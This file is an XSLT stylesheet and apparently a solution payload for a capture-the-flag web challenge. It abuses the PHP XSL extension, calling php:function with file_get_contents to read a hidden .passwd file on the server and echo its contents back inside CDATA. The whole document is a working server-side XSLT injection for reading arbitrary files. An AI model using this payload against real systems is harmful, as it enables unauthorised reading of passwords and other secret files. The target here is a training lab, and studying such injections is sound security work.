<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:php="http://php.net/xsl"
                version="1.0">
  <xsl:template match="/">
    <!-- Store the content of the file in a variable -->
    <xsl:variable name="fileContent" select="php:function('file_get_contents', '/challenge/web-serveur/ch50/.6ff3200bee785801f420fba826ffcdee/.passwd')" />
    
    <!-- Output the content of the file with CDATA -->
    <fileContent>
      <xsl:text disable-output-escaping="yes"><![CDATA[</xsl:text>
      <xsl:value-of select="$fileContent" />
      <xsl:text disable-output-escaping="yes">]]></xsl:text>
    </fileContent>
  </xsl:template>
</xsl:stylesheet>
